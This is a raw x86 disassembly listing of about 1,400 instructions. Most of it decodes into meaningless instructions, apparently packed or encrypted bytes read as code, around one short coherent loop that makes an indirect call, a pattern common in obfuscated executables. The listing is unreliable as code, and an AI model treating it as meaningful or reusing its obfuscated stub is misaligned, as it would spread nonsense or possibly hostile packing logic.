  41d846:	mov    edi,0x28d8ddd9
  41d84b:	xor    bl,0xd5
  41d84e:	(bad)  
  41d84f:	stc    
  41d850:	jecxz  0x41d7fc
  41d852:	jbe    0x41d7e7
  41d854:	ret    0xd04f
  41d857:	xor    esi,esi
  41d859:	push   edi
  41d85a:	and    eax,0xf2e63b57
  41d85f:	(bad)  
  41d861:	jne    0x41d8de
  41d863:	mov    eax,ds:0x90ddb035
  41d868:	cmp    al,0x5a
  41d86a:	add    DWORD PTR [ebp-0x4e9b8cec],ecx
  41d870:	mov    ds:0x5f60f35,al
  41d875:	mov    ch,0x29
  41d877:	push   ebp
  41d878:	ins    BYTE PTR es:[edi],dx
  41d879:	bound  esp,QWORD PTR [edx+0x66c045c3]
  41d87f:	inc    esp
  41d880:	popa   
  41d881:	inc    ebp
  41d882:	loop   0x41d812
  41d884:	jns    0x41d8f0
  41d886:	test   DWORD PTR ds:0xdd76f9ed,ebx
  41d88c:	xchg   BYTE PTR [ebp+0x26],dh
  41d88f:	aad    0x66
  41d891:	mov    dl,0x60
  41d893:	ror    dh,0xad
  41d896:	mov    bl,0xcc
  41d898:	push   esi
  41d899:	jp     0x41d828
  41d89b:	adc    edi,DWORD PTR [esi]
  41d89d:	sub    edi,ecx
  41d89f:	div    BYTE PTR [edi-0x58]
  41d8a2:	jge    0x41d896
  41d8a4:	cmp    DWORD PTR [esi+edx*1+0x512a9c0c],ebp
  41d8ab:	call   0x1a5c:0x51a2f1ab
  41d8b2:	or     edx,DWORD PTR [esi]
  41d8b4:	dec    edi
  41d8b5:	add    bh,BYTE PTR [eax]
  41d8b7:	add    WORD PTR [esi],0xd3f9
  41d8bc:	and    eax,0x6dacc7f9
  41d8c1:	inc    ebx
  41d8c2:	ja     0x41d877
  41d8c4:	es aad 0xa
  41d8c7:	jle    0x41d860
  41d8c9:	mov    edi,0x5ad878ec
  41d8ce:	xor    al,0xd7
  41d8d0:	xchg   DWORD PTR [edi+0x56],eax
  41d8d3:	mov    gs,ebx
  41d8d5:	stos   BYTE PTR es:[edi],al
  41d8d6:	mov    dh,BYTE PTR [ecx-0x67]
  41d8d9:	push   edx
  41d8da:	pop    edx
  41d8db:	shr    DWORD PTR [ecx-0x4cde1031],1
  41d8e1:	dec    ebp
  41d8e2:	aaa    
  41d8e3:	aam    0xae
  41d8e5:	in     eax,0xf7
  41d8e7:	xor    al,0x74
  41d8e9:	jecxz  0x41d87c
  41d8eb:	pusha  
  41d8ec:	adc    cl,BYTE PTR [ebp-0x61b79785]
  41d8f2:	mov    ds:0x106ff256,eax
  41d8f7:	(bad)  [edx+0x7]
  41d8fa:	pop    es
  41d8fb:	cmp    al,0x85
  41d8fd:	or     al,0x3
  41d8ff:	and    eax,0x8d13e7e9
  41d904:	stc    
  41d905:	ins    BYTE PTR es:[edi],dx
  41d906:	(bad)  
  41d907:	je     0x41d8e7
  41d909:	loope  0x41d902
  41d90b:	loope  0x41d90a
  41d90d:	add    bl,bh
  41d90f:	jmp    0x6f826a88
  41d914:	push   esp
  41d915:	dec    eax
  41d916:	stos   BYTE PTR es:[edi],al
  41d917:	ins    BYTE PTR es:[edi],dx
  41d918:	hlt    
  41d919:	cdq    
  41d91a:	lods   al,BYTE PTR ds:[esi]
  41d91b:	sbb    dl,ch
  41d91d:	(bad)  [edi+ebp*8+0x4e793f1f]
  41d924:	mov    ebp,0x6f8bfa1b
  41d929:	jl     0x41d96e
  41d92b:	or     ebp,DWORD PTR [edi]
  41d92d:	mov    bh,0x58
  41d92f:	outs   dx,DWORD PTR ds:[esi]
  41d930:	ins    BYTE PTR es:[edi],dx
  41d931:	into   
  41d932:	fstp   QWORD PTR [edi+0x72]
  41d935:	and    ebp,DWORD PTR [edi-0x1a8bb82e]
  41d93b:	dec    ecx
  41d93c:	pop    eax
  41d93d:	jmp    0x41d952
  41d93f:	retf   0x192c
  41d942:	mov    edx,0x910b4e2e
  41d947:	jge    0x41d8cd
  41d949:	frstor [edx+0x406ed412]
  41d94f:	jae    0x41d983
  41d951:	sbb    al,0x4d
  41d953:	mov    edi,0xec763dd1
  41d958:	stos   BYTE PTR es:[edi],al
  41d959:	out    dx,eax
  41d95a:	(bad)  
  41d95b:	adc    BYTE PTR [edi*8+0x4ec36543],al
  41d962:	jnp    0x41d9e1
  41d964:	fiadd  WORD PTR [ebx+esi*2+0x18]
  41d968:	sub    DWORD PTR [eax+edi*1+0x51ecc4ff],esp
  41d96f:	sbb    BYTE PTR ds:0x70d636d7,0xa9
  41d976:	cmp    al,0x9d
  41d978:	lods   al,BYTE PTR ds:[esi]
  41d979:	cld    
  41d97a:	or     eax,0xd9c45d9c
  41d97f:	inc    edx
  41d980:	scas   eax,DWORD PTR es:[edi]
  41d981:	fwait
  41d982:	adc    eax,0xbf6381ed
  41d987:	xor    DWORD PTR cs:[ebx+0x339e0c85],edx
  41d98e:	or     eax,DWORD PTR [edi-0x56]
  41d991:	push   esp
  41d992:	shr    esp,1
  41d994:	xor    eax,0x39589f6a
  41d999:	xor    ebx,DWORD PTR [edi+0x61]
  41d99c:	push   esi
  41d99d:	sbb    DWORD PTR [edi-0x231f7543],ebp
  41d9a3:	mov    cl,0x8c
  41d9a5:	dec    edx
  41d9a6:	popa   
  41d9a7:	fsubr  DWORD PTR [ecx]
  41d9a9:	sub    al,0x4d
  41d9ab:	imul   eax,DWORD PTR ds:0x1f512634,0x23d417e0
  41d9b5:	loope  0x41da13
  41d9b7:	sar    ch,1
  41d9b9:	jns    0x41d972
  41d9bb:	or     al,0x52
  41d9bd:	js     0x41d95d
  41d9bf:	in     eax,dx
  41d9c0:	jl     0x41d95a
  41d9c2:	push   ecx
  41d9c3:	mov    ds:0x45a1d29e,al
  41d9c8:	xchg   ecx,eax
  41d9c9:	or     eax,DWORD PTR [ebp+0xcae985d]
  41d9cf:	sub    eax,0xf18106d6
  41d9d4:	mov    ebp,DWORD PTR [ebx+0x74]
  41d9d7:	int3   
  41d9d8:	xchg   esi,eax
  41d9d9:	xchg   BYTE PTR [edi-0x53],al
  41d9dc:	xchg   ecx,eax
  41d9dd:	(bad)  
  41d9de:	nop
  41d9df:	add    al,0xc3
  41d9e1:	ror    DWORD PTR [eax+edx*4-0x76682f8c],cl
  41d9e8:	(bad)  
  41d9e9:	std    
  41d9ea:	push   cs
  41d9eb:	mov    WORD PTR [eax-0x31],?
  41d9ee:	sar    BYTE PTR [ecx],cl
  41d9f0:	dec    edi
  41d9f1:	and    dl,BYTE PTR [ebx-0x175922b6]
  41d9f7:	xor    ebx,DWORD PTR [esp+esi*1+0x3]
  41d9fb:	outs   dx,DWORD PTR ds:[esi]
  41d9fc:	retf   0xf112
  41d9ff:	pop    ds
  41da00:	lahf   
  41da01:	(bad)  
  41da02:	or     dh,BYTE PTR [ebp-0x7180f3ce]
  41da08:	add    DWORD PTR [eax+0x419fc13c],esp
  41da0e:	push   cs
  41da0f:	(bad)  
  41da10:	and    ch,al
  41da12:	pop    ds
  41da13:	mov    eax,0x83862c40
  41da18:	inc    eax
  41da19:	jns    0x41da8d
  41da1b:	jg     0x41da09
  41da1d:	retf   
  41da1e:	aas    
  41da1f:	add    esp,ebx
  41da21:	pop    esi
  41da22:	inc    DWORD PTR [edi-0x233fa92f]
  41da28:	arpl   WORD PTR [ebp-0x2e],dx
  41da2b:	xor    esp,ebp
  41da2d:	fimul  DWORD PTR [ecx]
  41da2f:	(bad)  
  41da30:	and    DWORD PTR ds:0x1a55a9c7,eax
  41da36:	clc    
  41da37:	add    BYTE PTR [ecx+0x434841b4],ch
  41da3d:	jbe    0x41d9f5
  41da3f:	dec    esi
  41da40:	outs   dx,BYTE PTR ds:[esi]
  41da41:	imul   BYTE PTR [ebp+0x72]
  41da44:	jbe    0x41da32
  41da46:	ret    0xba65
  41da49:	out    dx,eax
  41da4a:	rol    eax,0x99
  41da4d:	clc    
  41da4e:	mov    ebx,0xef18c45f
  41da53:	mov    WORD PTR [edi+0x40],ds
  41da56:	sbb    al,0x84
  41da58:	(bad)  
  41da5a:	(bad)  
  41da5b:	xor    DWORD PTR [edi],eax
  41da5d:	pop    es
  41da5e:	repz or al,0x69
  41da61:	sbb    ecx,0xffffffd8
  41da64:	addr16 cmp al,0xec
  41da67:	daa    
  41da68:	loope  0x41da49
  41da6a:	inc    eax
  41da6b:	shl    DWORD PTR [edx+0x26],0x4e
  41da6f:	into   
  41da70:	inc    eax
  41da71:	shl    BYTE PTR [edx-0x24],cl
  41da74:	ret    
  41da75:	(bad)  
  41da76:	test   eax,0xfde4aa8e
  41da7b:	popf   
  41da7c:	sbb    eax,0x62e3bbed
  41da81:	sub    ah,al
  41da83:	adc    BYTE PTR [ecx-0x51a86ded],dl
  41da89:	rcl    DWORD PTR [edi+ebp*4+0x5f659ff1],1
  41da90:	add    eax,ebx
  41da92:	and    BYTE PTR [edx+0x1f53a2f5],bh
  41da98:	sbb    dh,bl
  41da9a:	jo     0x41daf9
  41da9c:	cmc    
  41da9d:	sbb    cl,0x9f
  41daa0:	rol    DWORD PTR [ebx+0x11230e01],cl
  41daa6:	mov    al,0x77
  41daa8:	inc    ebx
  41daa9:	jle    0x41db0e
  41daab:	xchg   edi,eax
  41daac:	jno    0x41dae0
  41daae:	fsub   QWORD PTR [esi-0x3542c3c4]
  41dab4:	mov    bl,0x33
  41dab6:	dec    edx
  41dab7:	fwait
  41dab8:	or     eax,0xffe712ae
  41dabd:	outs   dx,DWORD PTR ds:[esi]
  41dabe:	neg    DWORD PTR [edx]
  41dac0:	lea    esi,[eax+eax*4]
  41dac3:	fild   DWORD PTR [esi+0x3f]
  41dac6:	loopne 0x41da94
  41dac8:	sub    DWORD PTR [edi-0x51],0x9af65852
  41dacf:	and    cl,BYTE PTR [edi-0x78c2c772]
  41dad5:	push   ds
  41dad6:	and    BYTE PTR [ebx],al
  41dad8:	mov    eax,0x9f1cb65e
  41dadd:	scas   eax,DWORD PTR es:[edi]
  41dade:	push   cs
  41dadf:	mov    eax,ds:0x64153768
  41dae4:	clc    
  41dae5:	fs test eax,0x64bdc1eb
  41daeb:	test   eax,0x1fe8b553
  41daf0:	popa   
  41daf1:	and    al,0xfb
  41daf3:	inc    edi
  41daf4:	and    ecx,DWORD PTR [eax+0x46]
  41daf7:	mov    dh,BYTE PTR [ebx-0x73a2bfcf]
  41dafd:	int    0xac
  41daff:	sbb    dl,BYTE PTR [ecx+0x405ba579]
  41db05:	daa    
  41db06:	inc    esi
  41db07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db08:	into   
  41db09:	pop    eax
  41db0a:	das    
  41db0b:	stos   DWORD PTR es:[edi],eax
  41db0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db0d:	fsubr  st,st(4)
  41db0f:	xchg   ebx,eax
  41db11:	ret    
  41db12:	and    ebp,DWORD PTR [ecx]
  41db14:	mov    dl,0xc6
  41db16:	sbb    DWORD PTR [esi+0x7364cc2],eax
  41db1c:	or     eax,0x80743979
  41db21:	push   ebx
  41db22:	(bad)  
  41db23:	pushf  
  41db24:	push   edi
  41db25:	or     al,0x3b
  41db27:	inc    eax
  41db28:	pop    edi
  41db29:	inc    ebx
  41db2a:	int    0x22
  41db2c:	sub    eax,0xad362f7
  41db31:	arpl   WORD PTR [esi-0x4858b2c5],sp
  41db37:	test   eax,0x88ca6aa6
  41db3c:	in     eax,dx
  41db3d:	push   es
  41db3e:	mov    esi,0x4519d459
  41db43:	stc    
  41db44:	push   es
  41db45:	xor    BYTE PTR [ebp+0x374ff2b9],0x1e
  41db4c:	cmc    
  41db4d:	jbe    0x41db83
  41db4f:	mov    esi,0x888bd42d
  41db54:	or     esi,DWORD PTR [esi+0xf34d8b6]
  41db5a:	mov    al,ds:0x602883be
  41db5f:	ins    DWORD PTR es:[edi],dx
  41db60:	xor    esi,eax
  41db62:	or     BYTE PTR [ebx-0x48],dl
  41db65:	clc    
  41db66:	(bad)  [esi+0xa]
  41db69:	sub    bl,bh
  41db6b:	xor    al,0xc6
  41db6d:	int    0xde
  41db6f:	sti    
  41db70:	out    0xf0,al
  41db72:	imul   esp,DWORD PTR [esi+0x933590a],0xfffffffb
  41db79:	pusha  
  41db7a:	iret   
  41db7b:	hlt    
  41db7c:	daa    
  41db7d:	rol    DWORD PTR [ecx+edi*1],0xc2
  41db81:	adc    al,0x3a
  41db83:	pop    esi
  41db84:	mov    ah,0x67
  41db86:	inc    edi
  41db87:	adc    bh,bh
  41db89:	pop    ds
  41db8a:	inc    eax
  41db8b:	or     BYTE PTR [edi+0x4cba47a6],dh
  41db91:	jo     0x41db1a
  41db93:	xchg   BYTE PTR [edi-0x5d0ae64b],bl
  41db99:	fisttp QWORD PTR [ecx]
  41db9b:	in     eax,dx
  41db9c:	imul   esp,ebp,0x70
  41db9f:	jmp    FWORD PTR [ebx-0x4175a2b8]
  41dba5:	mov    edi,0x97123b9c
  41dbaa:	sbb    edi,ebp
  41dbac:	fsubr  DWORD PTR [esi+0x8]
  41dbaf:	ja     0x41dbf3
  41dbb1:	xchg   ecx,edx
  41dbb3:	icebp  
  41dbb4:	in     eax,dx
  41dbb5:	lock jb 0x41dbed
  41dbb8:	ss jge 0x41db75
  41dbbb:	outs   dx,DWORD PTR ds:[esi]
  41dbbc:	mov    WORD PTR [ecx+0x10dc2e37],es
  41dbc2:	jmp    0xfade7906
  41dbc7:	fbld   TBYTE PTR [edi-0x21]
  41dbca:	mov    dl,0x2e
  41dbcc:	ds lahf 
  41dbce:	fwait
  41dbcf:	lods   al,BYTE PTR ds:[esi]
  41dbd0:	ret    
  41dbd1:	and    DWORD PTR [ecx],0x8d060751
  41dbd7:	in     al,dx
  41dbd8:	sahf   
  41dbd9:	add    eax,0x822e71c1
  41dbde:	enter  0xe8fa,0xd
  41dbe2:	fxch   st(2)
  41dbe4:	and    BYTE PTR [edi+0x47c27501],dl
  41dbea:	xchg   ebx,eax
  41dbeb:	mov    al,0xd1
  41dbed:	adc    DWORD PTR [ebx+ecx*1-0x77],eax
  41dbf1:	inc    ebp
  41dbf2:	lock mov ecx,DWORD PTR ds:0x42b1de
  41dbf9:	and    DWORD PTR ds:0x42b212,ecx
  41dbff:	xor    DWORD PTR [ebp-0x10],0xf89cb5a5
  41dc06:	mov    eax,DWORD PTR [ebp-0x18]
  41dc09:	mov    DWORD PTR ds:0x42b19a,0x12
  41dc13:	cmp    DWORD PTR ds:0x42b19a,0x0
  41dc1a:	je     0x41fffa
  41dc20:	cmp    DWORD PTR ds:0x42b19a,0x4
  41dc27:	jle    0x41fffa
  41dc2d:	jmp    0x41dc3b
  41dc32:	push   DWORD PTR [ebp-0x18]
  41dc35:	call   DWORD PTR ds:0x42b2f2
  41dc3b:	cmp    DWORD PTR ds:0x42b19a,0x5
  41dc42:	jne    0x41dc57
  41dc48:	xor    ecx,ecx
  41dc4a:	add    ecx,DWORD PTR ds:0x42b19a
  41dc50:	dec    ecx
  41dc51:	mov    DWORD PTR ds:0x42b19a,ecx
  41dc57:	mov    ecx,DWORD PTR ds:0x42b19a
  41dc5d:	dec    ecx
  41dc5e:	mov    DWORD PTR ds:0x42b19a,ecx
  41dc64:	jmp    0x41dc13
  41dc69:	jmp    0x41fffa
  41dc6e:	push   cs
  41dc6f:	mov    BYTE PTR [edi-0x79d57893],0x82
  41dc76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc77:	mov    dl,0xfb
  41dc79:	cs adc eax,0x7a4a9451
  41dc7f:	fild   DWORD PTR [eax-0x7ca1f07d]
  41dc85:	adc    DWORD PTR [ebx],0xffffffb5
  41dc88:	pop    esp
  41dc89:	sub    al,BYTE PTR [ecx+0x5c]
  41dc8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc8d:	mov    ecx,esi
  41dc8f:	fwait
  41dc90:	retf   0x628c
  41dc93:	ret    
  41dc94:	adc    BYTE PTR [ebx],al
  41dc96:	mov    WORD PTR [ebx+0x6b],ds
  41dc99:	mov    ecx,0x9e26ac29
  41dc9e:	rcr    DWORD PTR [edi+0x458416b],1
  41dca4:	out    dx,al
  41dca5:	std    
  41dca6:	fimul  WORD PTR [edx-0x76]
  41dca9:	rsm    
  41dcab:	std    
  41dcac:	popf   
  41dcad:	outs   dx,BYTE PTR ds:[esi]
  41dcae:	push   cs
  41dcaf:	aad    0xc
  41dcb1:	dec    edi
  41dcb2:	xchg   esp,eax
  41dcb3:	xchg   esi,eax
  41dcb4:	adc    al,0x91
  41dcb6:	js     0x41dd09
  41dcb8:	shl    dl,cl
  41dcba:	int    0xcb
  41dcbc:	cli    
  41dcbd:	xchg   BYTE PTR [ecx],dh
  41dcbf:	fldcw  WORD PTR [eax-0x3]
  41dcc2:	inc    esi
  41dcc3:	test   al,0x3d
  41dcc5:	mov    ebx,0x34026f97
  41dcca:	mov    al,ds:0xb5e37fed
  41dccf:	loopne 0x41dc86
  41dcd1:	mov    al,0x7e
  41dcd3:	cwde   
  41dcd4:	xchg   edx,eax
  41dcd5:	inc    ecx
  41dcd6:	orps   xmm7,XMMWORD PTR [ebx+0x51c0b6de]
  41dcdd:	sub    al,BYTE PTR [esi+0x7d3e5016]
  41dce3:	sub    BYTE PTR [ebx],cl
  41dce5:	or     BYTE PTR [esi],dl
  41dce7:	sub    eax,DWORD PTR [edx]
  41dce9:	popf   
  41dcea:	push   ds
  41dceb:	aad    0xc9
  41dced:	stc    
  41dcee:	jbe    0x41dc80
  41dcf0:	rcr    ecx,1
  41dcf2:	inc    eax
  41dcf3:	aaa    
  41dcf4:	pop    ebx
  41dcf5:	lods   al,BYTE PTR ds:[esi]
  41dcf6:	div    DWORD PTR [ebp+0x35]
  41dcf9:	aas    
  41dcfa:	cs sub esp,esp
  41dcfd:	outs   dx,DWORD PTR ds:[esi]
  41dcfe:	cdq    
  41dcff:	cmc    
  41dd00:	adc    bl,BYTE PTR [edx]
  41dd02:	pop    es
  41dd03:	sub    eax,0x4005732a
  41dd08:	int3   
  41dd09:	daa    
  41dd0a:	jno    0x41dd5d
  41dd0c:	inc    esi
  41dd0d:	imul   ebx,DWORD PTR [eax+ebp*2+0x31e5f12a],0x34e6f089
  41dd18:	iret   
  41dd19:	cmp    DWORD PTR [edi+0x77],esp
  41dd1c:	dec    edi
  41dd1d:	xchg   esi,eax
  41dd1e:	and    dl,BYTE PTR [ebx]
  41dd20:	push   ecx
  41dd21:	mov    bh,0x32
  41dd23:	inc    edi
  41dd24:	mov    dh,0xad
  41dd26:	(bad)  
  41dd27:	adc    eax,0x66895c2
  41dd2c:	ja     0x41dd02
  41dd2e:	xor    eax,0x5e7e3856
  41dd33:	or     edi,DWORD PTR [ebp-0x1a]
  41dd36:	cdq    
  41dd37:	(bad)  
  41dd38:	jno    0x41dda3
  41dd3a:	sub    al,0xb6
  41dd3c:	xor    dh,BYTE PTR [ebp-0x7be945d8]
  41dd42:	loop   0x41dd68
  41dd44:	mov    dl,0xb
  41dd46:	in     al,0xd9
  41dd48:	pop    ds
  41dd49:	mov    edi,0xef30a031
  41dd4e:	sub    BYTE PTR [ebx],0x14
  41dd51:	or     al,0x8f
  41dd53:	shl    BYTE PTR [edi-0x71],0x2
  41dd57:	repz cmp al,0xd1
  41dd5a:	aaa    
  41dd5b:	call   0x944e0224
  41dd60:	add    DWORD PTR [edx+edi*2],esp
  41dd63:	into   
  41dd64:	push   edx
  41dd65:	shl    bl,1
  41dd67:	out    0x96,al
  41dd69:	loopne 0x41dcf7
  41dd6b:	adc    ch,BYTE PTR [esi]
  41dd6d:	lahf   
  41dd6e:	fstp   TBYTE PTR [ebp+0x20]
  41dd71:	stc    
  41dd72:	xor    eax,0xad6201d3
  41dd77:	mov    cl,0x5
  41dd79:	out    dx,al
  41dd7a:	repz icebp 
  41dd7c:	out    0x60,eax
  41dd7e:	fdiv   QWORD PTR [edi-0x6a]
  41dd81:	pop    esp
  41dd82:	(bad)  [eax]
  41dd84:	mov    ch,dl
  41dd86:	push   ebx
  41dd87:	in     al,dx
  41dd88:	ja     0x41dd0d
  41dd8a:	ins    BYTE PTR es:[edi],dx
  41dd8b:	daa    
  41dd8c:	jno    0x41dd9d
  41dd8e:	(bad)  
  41dd90:	lods   eax,DWORD PTR ds:[esi]
  41dd91:	int    0x57
  41dd93:	lock fnsave [ebx+0x71954f30]
  41dd9a:	inc    edi
  41dd9b:	cmp    bh,dh
  41dd9d:	inc    ecx
  41dd9e:	test   al,0xa
  41dda0:	jno    0x41dd78
  41dda2:	push   es
  41dda3:	test   al,0x27
  41dda5:	sbb    ecx,DWORD PTR [ecx+esi*1-0x69e8a959]
  41ddac:	mov    gs,WORD PTR [eax+0x1a]
  41ddaf:	sub    ah,al
  41ddb1:	call   0xf972edf
  41ddb6:	jge    0x41ddeb
  41ddb8:	jecxz  0x41dd92
  41ddba:	adc    cl,ch
  41ddbc:	scas   al,BYTE PTR es:[edi]
  41ddbd:	test   esp,edx
  41ddbf:	lods   eax,DWORD PTR ds:[esi]
  41ddc0:	pop    ss
  41ddc1:	dec    esi
  41ddc2:	sbb    al,ch
  41ddc4:	and    al,0x7d
  41ddc6:	in     al,dx
  41ddc7:	in     al,dx
  41ddc8:	sub    al,0x91
  41ddca:	in     al,0xf8
  41ddcc:	dec    esp
  41ddcd:	jle    0x41de33
  41ddcf:	cmp    DWORD PTR [edx],ebx
  41ddd1:	inc    esi
  41ddd2:	sbb    edx,DWORD PTR [esi]
  41ddd4:	clc    
  41ddd5:	outs   dx,BYTE PTR ds:[esi]
  41ddd6:	lock fisubr DWORD PTR [ebp-0x72]
  41ddda:	add    dh,BYTE PTR [ebx]
  41dddc:	jne    0x41dd5f
  41ddde:	popa   
  41dddf:	lahf   
  41dde0:	mov    al,0x5a
  41dde2:	mov    al,0x53
  41dde4:	(bad)  
  41dde5:	xor    al,0x76
  41dde7:	inc    eax
  41dde8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dde9:	push   ecx
  41ddea:	bound  ebx,QWORD PTR [ecx+0x32a16b32]
  41ddf0:	call   0x5a3:0xbe01eca2
  41ddf7:	xor    eax,0x7f37ef82
  41ddfc:	gs fld st(2)
  41ddff:	or     al,0xab
  41de01:	jb     0x41ddad
  41de03:	pop    ebp
  41de04:	test   al,0x6a
  41de06:	arpl   WORD PTR [edi+0x74],si
  41de09:	jne    0x41ddd1
  41de0b:	ror    ecx,1
  41de0d:	ins    DWORD PTR es:[edi],dx
  41de0e:	xlat   BYTE PTR ds:[ebx]
  41de0f:	jno    0x41ddab
  41de11:	mov    fs,WORD PTR [edi+0x2e]
  41de14:	xor    BYTE PTR [ecx+0x75b1715c],dl
  41de1a:	inc    edx
  41de1b:	sahf   
  41de1c:	xchg   BYTE PTR [eax+0x67],al
  41de1f:	icebp  
  41de20:	imul   ebp,esp,0xffffff95
  41de23:	cmp    al,0x9e
  41de25:	push   ds
  41de26:	and    ebp,esi
  41de28:	imul   edx,DWORD PTR [eax],0xd1341d50
  41de2e:	push   0x64c05a59
  41de33:	jne    0x41de50
  41de35:	sub    eax,0xc0be1644
  41de3a:	cmp    BYTE PTR [eax-0x41],bl
  41de3d:	(bad)  
  41de3e:	push   ds
  41de3f:	scas   eax,DWORD PTR es:[edi]
  41de40:	adc    bh,BYTE PTR [edx-0x6e002936]
  41de46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de47:	mov    ebx,0x11366634
  41de4c:	adc    al,0xf2
  41de4e:	or     al,0x48
  41de50:	sbb    BYTE PTR [edx],0x13
  41de53:	call   0xcde6790
  41de58:	mov    eax,0x4a11b1bb
  41de5d:	xor    DWORD PTR [ebp+0x22],eax
  41de60:	sbb    cl,dh
  41de62:	pushf  
  41de63:	in     al,dx
  41de64:	add    esp,DWORD PTR [edi-0x10fa8c98]
  41de6a:	(bad)  
  41de6b:	xlat   BYTE PTR ds:[ebx]
  41de6c:	push   ss
  41de6d:	mov    eax,0x1f39bf5a
  41de72:	pop    esp
  41de73:	cdq    
  41de74:	mov    eax,ds:0x19eaaf83
  41de79:	dec    edx
  41de7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de7c:	not    esp
  41de7e:	inc    esp
  41de7f:	mov    BYTE PTR [esi],cl
  41de81:	or     al,0x36
  41de83:	pop    esi
  41de84:	mov    cl,0xc3
  41de86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de87:	jno    0x41de4d
  41de89:	out    0xf5,al
  41de8b:	cmp    DWORD PTR ds:0xadd830fb,ebp
  41de91:	inc    eax
  41de92:	clc    
  41de93:	adc    bl,BYTE PTR [ebx]
  41de95:	cmp    BYTE PTR [edx],ch
  41de97:	hlt    
  41de98:	outs   dx,DWORD PTR ds:[esi]
  41de99:	jmp    0x279e:0x9e07c3ce
  41dea0:	retf   0xac2b
  41dea3:	les    esp,FWORD PTR [esi+0x398df27e]
  41dea9:	xchg   esp,eax
  41deaa:	sbb    al,0x91
  41deac:	ds or  al,0xd
  41deaf:	jl     0x41dedb
  41deb1:	sbb    esp,ecx
  41deb3:	xor    ah,dl
  41deb5:	or     esp,eax
  41deb7:	pop    ds
  41deb8:	push   edi
  41deb9:	sub    eax,0x43704b5c
  41debe:	jecxz  0x41de5d
  41dec0:	pop    edi
  41dec1:	aas    
  41dec2:	xchg   esi,eax
  41dec3:	adc    eax,0xe5815ce6
  41dec8:	sbb    cl,BYTE PTR [ebx+0xf]
  41decb:	mov    esi,DWORD PTR [edx-0x26]
  41dece:	pushf  
  41decf:	sbb    DWORD PTR [ecx+0x3d5b34e],ebp
  41ded5:	into   
  41ded6:	hlt    
  41ded7:	fldenv [ecx]
  41ded9:	jbe    0x41dede
  41dedb:	jg     0x41ded6
  41dedd:	push   0xffffff82
  41dedf:	cmp    DWORD PTR ds:0xc5eb06eb,edi
  41dee5:	jecxz  0x41df35
  41dee7:	pop    ds
  41dee8:	and    eax,0x443e9097
  41deed:	ins    BYTE PTR es:[edi],dx
  41deee:	jno    0x41dea3
  41def0:	dec    esi
  41def1:	aad    0x8e
  41def3:	xor    dl,cl
  41def5:	into   
  41def6:	mov    ds:0x33c114fc,eax
  41defb:	sub    ebp,DWORD PTR [esi]
  41defd:	cmc    
  41defe:	aaa    
  41deff:	pop    ecx
  41df00:	ret    0xfcdf
  41df03:	mov    esi,0xd24e9e9d
  41df08:	sar    DWORD PTR [edx+edi*2],1
  41df0b:	cli    
  41df0c:	cmc    
  41df0d:	jbe    0x41de97
  41df0f:	jmp    0x41dedf
  41df11:	xor    al,0x3c
  41df13:	(bad)  [edi]
  41df15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df16:	mov    BYTE PTR ds:0x1df9819e,bh
  41df1c:	in     eax,dx
  41df1d:	push   edi
  41df1e:	jno    0x41df05
  41df20:	pushf  
  41df21:	and    eax,0x4df1b5a3
  41df26:	nop
  41df27:	xchg   ebp,eax
  41df28:	jecxz  0x41df0f
  41df2a:	xlat   BYTE PTR ds:[ebx]
  41df2b:	bound  esi,QWORD PTR [edi]
  41df2d:	pop    ebp
  41df2e:	adc    BYTE PTR [eax+0x1350f50d],0x61
  41df35:	scas   al,BYTE PTR es:[edi]
  41df36:	jmp    0x9479:0x59d9384b
  41df3d:	jmp    0xc140:0xd236d08c
  41df44:	test   bl,ah
  41df46:	(bad)  
  41df47:	jne    0x41df23
  41df49:	add    DWORD PTR [ebp-0x5faf7cbd],0xffffffed
  41df50:	dec    ecx
  41df51:	jbe    0x41df73
  41df53:	xchg   esp,eax
  41df54:	add    BYTE PTR [edi],dl
  41df56:	fwait
  41df57:	outs   dx,DWORD PTR ds:[esi]
  41df58:	or     eax,0x95c6ca4
  41df5d:	sub    BYTE PTR [ecx],dh
  41df5f:	aas    
  41df60:	loopne 0x41df37
  41df62:	sub    al,0x6b
  41df64:	int3   
  41df65:	gs dec eax
  41df67:	jnp    0x41dfe1
  41df69:	xchg   ebp,eax
  41df6a:	cwde   
  41df6b:	jmp    0x41dfae
  41df6d:	pop    ss
  41df6e:	dec    ebp
  41df6f:	sub    ch,BYTE PTR [ebp-0x37244820]
  41df75:	xchg   edi,eax
  41df76:	aas    
  41df77:	pop    es
  41df78:	cmp    esp,DWORD PTR [edi-0x708748c6]
  41df7e:	cld    
  41df7f:	sbb    al,0x73
  41df81:	stos   BYTE PTR es:[edi],al
  41df82:	lods   al,BYTE PTR ds:[esi]
  41df83:	lds    esi,FWORD PTR [ebp-0x48a96ece]
  41df89:	jbe    0x41dfec
  41df8b:	xchg   ebp,eax
  41df8c:	pop    es
  41df8d:	and    DWORD PTR [ebp+0x0],ecx
  41df90:	xchg   edi,eax
  41df91:	xchg   ebp,eax
  41df92:	int3   
  41df93:	or     al,0x8c
  41df95:	add    DWORD PTR [esi-0x98e7202],esp
  41df9b:	lock fisttp QWORD PTR [esi-0x3112f358]
  41dfa2:	dec    edx
  41dfa3:	addr16 test al,0x1
  41dfa6:	aas    
  41dfa7:	repz cmp dh,bl
  41dfaa:	loopne 0x41e01c
  41dfac:	pop    esp
  41dfad:	pop    esp
  41dfae:	scas   al,BYTE PTR es:[edi]
  41dfaf:	sbb    BYTE PTR [esp+eiz*4+0x15],cl
  41dfb3:	push   0x15
  41dfb5:	mov    esi,0x6c2c60ce
  41dfba:	push   es
  41dfbb:	out    0x83,eax
  41dfbd:	push   eax
  41dfbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfbf:	retf   0xaa0f
  41dfc2:	mov    ebx,0xb15dc187
  41dfc7:	xchg   ecx,eax
  41dfc8:	int3   
  41dfc9:	cmc    
  41dfca:	and    DWORD PTR [edx+ebp*2-0x2f],0xbb3a1bdb
  41dfd2:	sbb    BYTE PTR [esi],dh
  41dfd4:	jle    0x41dfac
